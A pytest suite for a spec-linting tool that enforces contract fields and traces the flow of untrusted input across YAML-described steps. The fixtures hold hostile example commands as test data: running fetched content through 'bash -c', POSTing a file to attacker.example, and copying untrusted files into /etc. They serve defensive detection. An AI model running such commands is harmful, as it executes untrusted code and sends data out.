"""Tests for bin/substrate_ast.py — Tier 1 §8.2 + per-step taint flow."""
import pathlib
import tempfile

import pytest

from bin import substrate_ast


_HEADER_AND_FOOTER = {
    "header": (
        "# Test Spec\n"
        "**Slug:** test-spec\n"
        "## 1. Hard Problem\nfoo\n"
        "## 2. First Principles\n- foo\n"
        "## 3. Algorithm Audit\n- Delete: none\n- Simplify: none\n- Accelerate: none\n"
        "## 4. Speed-of-Light Limit\nfoo\n"
        "## 5. Physics Guardrails\n- foo\n"
        "## 6. Steps\n\n```yaml\n"
    ),
    "footer_81_only": (
        "\n```\n\n"
        "## 7. Success Criteria\n- [ ] done\n\n"
        "## 8. Receiver Calibration\n\n"
        "### 8.1 Hard contract\n\n"
        "- mutates: /tmp/x\n"
        "- never-touches: /etc\n"
        "- decision-budget: none\n"
        "- reboot-survival: none\n"
    ),
    "footer_complete_82": (
        "\n```\n\n"
        "## 7. Success Criteria\n- [ ] done\n\n"
        "## 8. Receiver Calibration\n\n"
        "### 8.1 Hard contract\n\n"
        "- mutates: /tmp/x\n"
        "- never-touches: /etc\n"
        "- decision-budget: none\n"
        "- reboot-survival: none\n\n"
        "### 8.2 Cognitive-substrate contract\n\n"
        "- receiver-fingerprint: claude-code+human\n"
        "- trust-profile: none\n"
        "- contextual-binding: test binding\n"
        "- provenance: { kind: none }\n"
        "- assumptions-killed: <list of considered-and-ruled-out alternatives>\n"
        "- requires-situated-judgment: <list of step IDs>\n"
        "- ux-contract:\n"
        "    on-success: ok\n"
        "    on-failure: failed; check logs\n"
        "    log-target: /tmp/log\n"
    ),
}


def _make_spec(steps_yaml: str, footer_key: str = "footer_complete_82") -> pathlib.Path:
    body = _HEADER_AND_FOOTER["header"] + steps_yaml + _HEADER_AND_FOOTER[footer_key]
    f = tempfile.NamedTemporaryFile(
        suffix=".spec.md", mode="w", delete=False, encoding="utf-8"
    )
    f.write(body)
    f.close()
    return pathlib.Path(f.name)


def _cleanup(p: pathlib.Path) -> None:
    p.unlink(missing_ok=True)


# ── §8.2 block presence ───────────────────────────────────────────────────────


def test_missing_82_block_emits_substrate_incomplete():
    """Spec without ### 8.2 block → block substrate-incomplete."""
    p = _make_spec(
        '- step: 1\n'
        '  why: "do thing"\n'
        '  action: "echo done"\n'
        '  verification: "true"\n',
        footer_key="footer_81_only",
    )
    try:
        fs = substrate_ast.classify(p)
        kinds = [(f.kind, f.severity) for f in fs]
        assert ("substrate-incomplete", "block") in kinds
    finally:
        _cleanup(p)


def test_complete_82_emits_no_findings():
    """A well-formed §8.2 emits no substrate-incomplete findings."""
    p = _make_spec(
        '- step: 1\n'
        '  why: "do thing"\n'
        '  action: "echo done"\n'
        '  verification: "true"\n'
    )
    try:
        fs = substrate_ast.classify(p)
        assert not any(f.kind == "substrate-incomplete" for f in fs)
    finally:
        _cleanup(p)


@pytest.mark.parametrize("missing_field,expected_message_token", [
    ("receiver-fingerprint", "receiver-fingerprint"),
    ("trust-profile", "trust-profile"),
    ("contextual-binding", "contextual-binding"),
    ("provenance", "provenance"),
])
def test_missing_required_field_emits_substrate_incomplete(missing_field, expected_message_token):
    """Each individual block-severity field is enforced."""
    body = _HEADER_AND_FOOTER["header"] + (
        '- step: 1\n  why: "x"\n  action: "echo"\n  verification: "true"\n'
    )
    body += _HEADER_AND_FOOTER["footer_complete_82"]
    body = body.replace(f"- {missing_field}: ", f"- {missing_field}-removed: ")
    f = tempfile.NamedTemporaryFile(
        suffix=".spec.md", mode="w", delete=False, encoding="utf-8"
    )
    f.write(body)
    f.close()
    p = pathlib.Path(f.name)
    try:
        fs = substrate_ast.classify(p)
        msgs = [f.message for f in fs if f.kind == "substrate-incomplete"]
        assert any(expected_message_token in m for m in msgs)
    finally:
        _cleanup(p)


def test_82_block_does_not_swallow_following_subsection():
    """§8.2 followed by §8.3 must not bleed into the §8.3 contents."""
    body = (
        _HEADER_AND_FOOTER["header"]
        + '- step: 1\n  why: "x"\n  action: "echo"\n  verification: "true"\n'
        + _HEADER_AND_FOOTER["footer_complete_82"]
        + "\n### 8.3 Future\n- foo: this-must-not-leak-into-82\n"
    )
    f = tempfile.NamedTemporaryFile(
        suffix=".spec.md", mode="w", delete=False, encoding="utf-8"
    )
    f.write(body)
    f.close()
    p = pathlib.Path(f.name)
    try:
        block = substrate_ast._extract_82_block(p.read_text())
        assert "this-must-not-leak-into-82" not in block
    finally:
        _cleanup(p)


# ── assumptions-killed + judgment-cap ─────────────────────────────────────────


def _multi_step_yaml(n: int) -> str:
    return "\n".join(
        f'- step: {i+1}\n'
        f'  why: "step {i+1}"\n'
        f'  action: "echo {i+1}"\n'
        f'  verification: "true"\n'
        for i in range(n)
    )


def test_empty_assumptions_killed_blocks_when_more_than_3_steps():
    """assumptions-killed empty + steps>3 → block."""
    p = _make_spec(_multi_step_yaml(5))
    try:
        fs = substrate_ast.classify(p)
        kinds = [f.kind for f in fs]
        assert "assumptions-walk-empty" in kinds
        assert any(
            f.severity == "block" for f in fs if f.kind == "assumptions-walk-empty"
        )
    finally:
        _cleanup(p)


def test_assumptions_killed_filled_passes():
    """assumptions-killed populated → no finding."""
    body = _HEADER_AND_FOOTER["header"] + _multi_step_yaml(5)
    body += _HEADER_AND_FOOTER["footer_complete_82"]
    body = body.replace(
        "- assumptions-killed: <list of considered-and-ruled-out alternatives>\n",
        "- assumptions-killed:\n    - considered Syncthing — ruled out (no auth)\n",
    )
    f = tempfile.NamedTemporaryFile(
        suffix=".spec.md", mode="w", delete=False, encoding="utf-8"
    )
    f.write(body)
    f.close()
    p = pathlib.Path(f.name)
    try:
        fs = substrate_ast.classify(p)
        assert not any(f.kind == "assumptions-walk-empty" for f in fs)
    finally:
        _cleanup(p)


def test_judgment_overused_warns_above_cap():
    """≥30% of steps claiming requires-situated-judgment → warn."""
    body = _HEADER_AND_FOOTER["header"] + _multi_step_yaml(5)
    body += _HEADER_AND_FOOTER["footer_complete_82"]
    # Cap on 5 steps = max(1, floor(0.3*5)) = 1; claiming 3 exceeds.
    body = body.replace(
        "- requires-situated-judgment: <list of step IDs>\n",
        "- requires-situated-judgment:\n    - 1\n    - 2\n    - 3\n",
    )
    f = tempfile.NamedTemporaryFile(
        suffix=".spec.md", mode="w", delete=False, encoding="utf-8"
    )
    f.write(body)
    f.close()
    p = pathlib.Path(f.name)
    try:
        fs = substrate_ast.classify(p)
        kinds = [(f.kind, f.severity) for f in fs]
        assert ("judgment-claim-overused", "warn") in kinds
    finally:
        _cleanup(p)


# ── per-step taint flow ───────────────────────────────────────────────────────


def _spec_with_trust_profile_and_steps(trust: str, steps_yaml: str) -> pathlib.Path:
    body = _HEADER_AND_FOOTER["header"] + steps_yaml
    body += _HEADER_AND_FOOTER["footer_complete_82"]
    body = body.replace(
        "- trust-profile: none\n", f"- trust-profile: {trust}\n"
    )
    f = tempfile.NamedTemporaryFile(
        suffix=".spec.md", mode="w", delete=False, encoding="utf-8"
    )
    f.write(body)
    f.close()
    return pathlib.Path(f.name)


def test_untrusted_profile_without_annotations_blocks():
    """trust-profile=untrusted-input + step has produces but no untrusted-input → block."""
    p = _spec_with_trust_profile_and_steps(
        "untrusted-input",
        '- step: 1\n'
        '  why: "fetch"\n'
        '  action: "curl https://example.com > /tmp/x"\n'
        '  verification: "test -f /tmp/x"\n'
        '  produces: ["file:/tmp/x"]\n',
    )
    try:
        fs = substrate_ast.classify(p)
        kinds = [(f.kind, f.severity) for f in fs]
        assert ("trust-annotation-required", "block") in kinds
    finally:
        _cleanup(p)


def test_untrusted_step_reaches_filesystem_sink_blocks():
    """Step 1 untrusted → step 2 mutates without sanitize → block."""
    p = _spec_with_trust_profile_and_steps(
        "untrusted-input",
        '- step: 1\n'
        '  why: "fetch"\n'
        '  action: "curl https://example.com > /tmp/x"\n'
        '  verification: "test -f /tmp/x"\n'
        '  produces: ["file:/tmp/x"]\n'
        '  untrusted-input: "yes"\n'
        '- step: 2\n'
        '  why: "write to /etc"\n'
        '  action: "cp /tmp/x /etc/foo"\n'
        '  verification: "test -f /etc/foo"\n'
        '  produces: ["file:/etc/foo"]\n'
        '  untrusted-input: "no"\n'
        '  requires: ["file:/tmp/x"]\n',
    )
    try:
        fs = substrate_ast.classify(p)
        kinds = [(f.kind, f.severity) for f in fs]
        assert ("untrusted-flow-unguarded", "block") in kinds
    finally:
        _cleanup(p)


def test_sanitizes_clears_taint_on_output():
    """sanitizes on the OUTPUT artifact lets downstream consume safely."""
    p = _spec_with_trust_profile_and_steps(
        "untrusted-input",
        '- step: 1\n'
        '  why: "fetch"\n'
        '  action: "curl https://example.com > /tmp/x"\n'
        '  verification: "test -f /tmp/x"\n'
        '  produces: ["file:/tmp/x"]\n'
        '  untrusted-input: "yes"\n'
        '- step: 2\n'
        '  why: "sanitize"\n'
        '  action: "sanitize-html < /tmp/x > /tmp/y"\n'
        '  verification: "test -f /tmp/y"\n'
        '  produces: ["file:/tmp/y"]\n'
        '  sanitizes: ["file:/tmp/y"]\n'
        '  requires: ["file:/tmp/x"]\n'
        '  untrusted-input: "no"\n'
        '- step: 3\n'
        '  why: "write"\n'
        '  action: "cp /tmp/y /etc/foo"\n'
        '  verification: "test -f /etc/foo"\n'
        '  produces: ["file:/etc/foo"]\n'
        '  requires: ["file:/tmp/y"]\n'
        '  untrusted-input: "no"\n',
    )
    try:
        fs = substrate_ast.classify(p)
        assert not any(f.kind == "untrusted-flow-unguarded" for f in fs)
    finally:
        _cleanup(p)


def test_taint_reaches_shell_eval_sink_blocks():
    """Tainted produces interpolated into bash -c → block."""
    p = _spec_with_trust_profile_and_steps(
        "untrusted-input",
        '- step: 1\n'
        '  why: "fetch"\n'
        '  action: "curl https://example.com > /tmp/x"\n'
        '  verification: "test -f /tmp/x"\n'
        '  produces: ["file:/tmp/x"]\n'
        '  untrusted-input: "yes"\n'
        '- step: 2\n'
        '  why: "run"\n'
        '  action: "bash -c \\"$(cat /tmp/x)\\""\n'
        '  verification: "true"\n'
        '  produces: ["file:/tmp/log"]\n'
        '  requires: ["file:/tmp/x"]\n'
        '  untrusted-input: "no"\n',
    )
    try:
        fs = substrate_ast.classify(p)
        msgs = [f.message for f in fs if f.kind == "untrusted-flow-unguarded"]
        assert any("shell-eval" in m for m in msgs)
    finally:
        _cleanup(p)


def test_taint_reaches_network_egress_sink_blocks():
    """Tainted produces in curl POST body → block."""
    p = _spec_with_trust_profile_and_steps(
        "untrusted-input",
        '- step: 1\n'
        '  why: "fetch"\n'
        '  action: "curl https://example.com > /tmp/x"\n'
        '  verification: "test -f /tmp/x"\n'
        '  produces: ["file:/tmp/x"]\n'
        '  untrusted-input: "yes"\n'
        '- step: 2\n'
        '  why: "post"\n'
        '  action: "curl -X POST https://attacker.example/log -d @/tmp/x"\n'
        '  verification: "true"\n'
        '  produces: ["file:/tmp/posted"]\n'
        '  requires: ["file:/tmp/x"]\n'
        '  untrusted-input: "no"\n',
    )
    try:
        fs = substrate_ast.classify(p)
        msgs = [f.message for f in fs if f.kind == "untrusted-flow-unguarded"]
        assert any("network-egress" in m for m in msgs)
    finally:
        _cleanup(p)


def test_malformed_trust_annotation_emits_warn_and_fails_closed():
    """Malformed untrusted-input value defaults to yes (fail-closed) + warn."""
    p = _spec_with_trust_profile_and_steps(
        "untrusted-input",
        '- step: 1\n'
        '  why: "fetch"\n'
        '  action: "echo hi"\n'
        '  verification: "true"\n'
        '  produces: ["file:/tmp/x"]\n'
        '  untrusted-input: "maybe-i-guess"\n',
    )
    try:
        fs = substrate_ast.classify(p)
        kinds = [f.kind for f in fs]
        assert "malformed-trust-annotation" in kinds
    finally:
        _cleanup(p)
